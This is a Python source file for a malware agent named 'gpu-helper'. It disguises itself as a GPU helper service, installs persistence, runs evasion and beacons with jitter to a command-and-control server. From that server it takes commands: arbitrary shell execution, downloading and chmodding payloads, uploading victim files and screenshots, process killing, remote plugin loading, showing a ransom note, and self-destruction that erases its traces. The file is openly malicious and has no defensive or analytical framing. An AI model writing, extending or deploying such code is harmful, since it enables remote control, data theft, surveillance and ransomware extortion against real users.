import os
import sys
import json
import random
import time
import socket
import subprocess
import threading
import platform
import tempfile
import urllib.parse
import urllib.request
import webbrowser

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.persistence import (
    is_persistent,
    install_persistence,
    remove_persistence,
)
from lib.c2_client import get_system_info, send_beacon, upload_file
from lib.evasion import run_evasion
from lib import plugin_loader

from settings import C2_SERVER, TRAFFIC_KEY, BUILD_NUMBER

SERVICE_NAME = "gpu-helper"
EXE_PATH = os.path.abspath(sys.argv[0])
BEACON_INTERVAL = 60


def exec_command(
    cmd: str, params: dict, files: list, agent_state: dict
) -> str:
    if cmd == 'status':
        return (
            f'agent: gpu_helper, '
            f'persistent: {agent_state.get("persistent")}, '
            f'tracked: {len(files)} files'
        )
    elif cmd == 'persist':
        if is_persistent(SERVICE_NAME):
            return 'already persistent'
        install_persistence(SERVICE_NAME, EXE_PATH)
        return 'persistence installed'
    elif cmd == 'exec':
        command = params.get('cmd', '')
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True,
                text=True, timeout=30
            )
            output = result.stdout + result.stderr
            return output[:1000] if output else '(no output)'
        except Exception as e:
            return f'exec error: {e}'
    elif cmd == 'self_destruct':
        remove_persistence("gpu-helper")
        remove_persistence("hw-detect")
        for f in [".decrypt.txt", "README.txt"]:
            try:
                os.remove(f)
            except Exception:
                pass
        note = os.path.join(tempfile.gettempdir(), ".hw-tools", ".suicide_note")
        try:
            os.makedirs(os.path.dirname(note), exist_ok=True)
            with open(note, 'w') as f:
                f.write('self_destruct')
        except Exception:
            pass
        agent_state['result'] = 'self_destructed'
        send_beacon(C2_SERVER, agent_state, TRAFFIC_KEY)
        try:
            os.unlink(EXE_PATH)
        except Exception:
            pass
        os._exit(0)
    elif cmd == 'download':
        url = params.get('url', '')
        if not url:
            return 'no url provided'
        dest = params.get('path', '') or os.path.join(
            tempfile.gettempdir(), os.path.basename(url.split('?')[0])
        )
        try:
            resp = urllib.request.urlopen(url, timeout=30)
            with open(dest, 'wb') as f:
                f.write(resp.read())
            os.chmod(dest, 0o755)
            return f'downloaded to {dest}'
        except Exception as e:
            return f'download error: {e}'
    elif cmd == 'upload':
        path = params.get('path', '')
        if not path or not os.path.exists(path):
            return 'file not found'
        return upload_file(C2_SERVER, agent_state.get('hostname', ''), path)
    elif cmd == 'network_info':
        return _collect_network_info()
    elif cmd == 'show_ransomnote':
        return _show_ransom_note()
    elif cmd == 'screenshot':
        return _take_screenshot(agent_state.get('hostname', 'unknown'))
    elif cmd == 'pslist':
        return _list_processes()
    elif cmd == 'pskill':
        pid = params.get('pid', '')
        return _kill_process(pid)
    elif cmd == 'load_plugin':
        name = params.get('plugin_name', '')
        if not name:
            return 'load_plugin: no plugin_name'
        hn = agent_state.get('hostname', '')
        path = plugin_loader.download_plugin(C2_SERVER, name, hn)
        if not path:
            return f'load_plugin: failed to download {name}'
        info = plugin_loader.load_plugin_from_path(path)
        if not info:
            return f'load_plugin: failed to load {name}'
        return (
            f'loaded {info["name"]} v{info["version"]} '
            f'— {len(info["commands"])} commands registered'
        )
    elif cmd == 'unload_plugin':
        name = params.get('plugin_name', '')
        if not name:
            return 'unload_plugin: no plugin_name'
        if plugin_loader.unload_plugin(name):
            return f'unloaded {name}'
        return f'unload_plugin: {name} not loaded'
    elif cmd == 'list_plugins':
        info = plugin_loader.list_plugins()
        if not info:
            return 'no plugins loaded'
        lines = []
        for pname, pdata in info.items():
            cmds = ', '.join(pdata.get('commands', []))
            lines.append(f'{pname} v{pdata.get("version", "?")} [{cmds}]')
        return '\n'.join(lines)

    result = plugin_loader.dispatch(cmd, params, {
        'files': files,
        'state': agent_state,
        'public_key': PUBLIC_KEY_PEM,
    })
    if result is not None:
        return result
    return f'unknown command: {cmd}'


def _collect_network_info() -> str:
    try:
        lines = []
        for cmd in [['ip', 'addr'], ['ip', 'route'], ['ss', '-tlnp']]:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                lines.append(r.stdout[:1500])
            except Exception:
                pass
        return '\n'.join(lines)[:3000] or 'no network info'
    except Exception as e:
        return f'network info error: {e}'


def _show_ransom_note() -> str:
    note_path = os.path.join(os.getcwd(), "README.txt")
    if not os.path.exists(note_path):
        return 'ransom note not found'
    try:
        subprocess.Popen(['xdg-open', note_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return 'ransom note displayed'
    except Exception as e:
        return f'display error: {e}'


def _take_screenshot(hostname: str) -> str:
    tmp = os.path.join(tempfile.gettempdir(), '.screenshot.png')
    try:
        for tool in [
            ['import', '-window', 'root', tmp],
            ['scrot', tmp],
            ['gnome-screenshot', '-f', tmp],
        ]:
            try:
                subprocess.run(tool, capture_output=True, timeout=15)
                if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
                    break
            except Exception:
                continue
        if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
            result = upload_file(C2_SERVER, hostname, tmp)
            os.unlink(tmp)
            return f'screenshot: {result}'
        return 'screenshot: failed (no tools available)'
    except Exception as e:
        return f'screenshot error: {e}'


def _list_processes() -> str:
    try:
        r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=15)
        output = (r.stdout or '') + (r.stderr or '')
        return output[:3000] if output else '(no output)'
    except Exception as e:
        return f'pslist error: {e}'


def _kill_process(pid: str) -> str:
    if not pid or not pid.isdigit():
        return 'kill: invalid pid'
    pid_int = int(pid)
    if pid_int == os.getpid():
        return 'kill: cannot kill self'
    try:
        subprocess.run(['kill', str(pid_int)], capture_output=True, text=True, timeout=10)
        return f'kill: signal sent to {pid}'
    except Exception as e:
        return f'kill error: {e}'


def beacon_loop():
    info = get_system_info(lambda: is_persistent(SERVICE_NAME))
    info['agent'] = 'gpu_helper'
    info['type'] = 'installer'
    info['architecture'] = platform.machine()
    info['version'] = '1.0'
    info['build_number'] = BUILD_NUMBER
    last_result = None
    tracked_files: list[str] = []

    while True:
        info['persistent'] = is_persistent(SERVICE_NAME)
        info['loaded_plugins'] = list(plugin_loader.list_plugins().keys())
        info['result'] = last_result
        result = send_beacon(
            C2_SERVER, info, TRAFFIC_KEY
        )
        info.pop('result', None)

        if result and result.get('command'):
            cmd_data = result['command']
            cmd_name = cmd_data.get('command')
            cmd_params = cmd_data.get('params', {})
            cmd_result = exec_command(
                cmd_name, cmd_params, tracked_files, info
            )
            last_result = cmd_result

        jitter = random.randint(0, 30)
        time.sleep(BEACON_INTERVAL + jitter)


if __name__ == '__main__':
    run_evasion(EXE_PATH)
    beacon_loop()
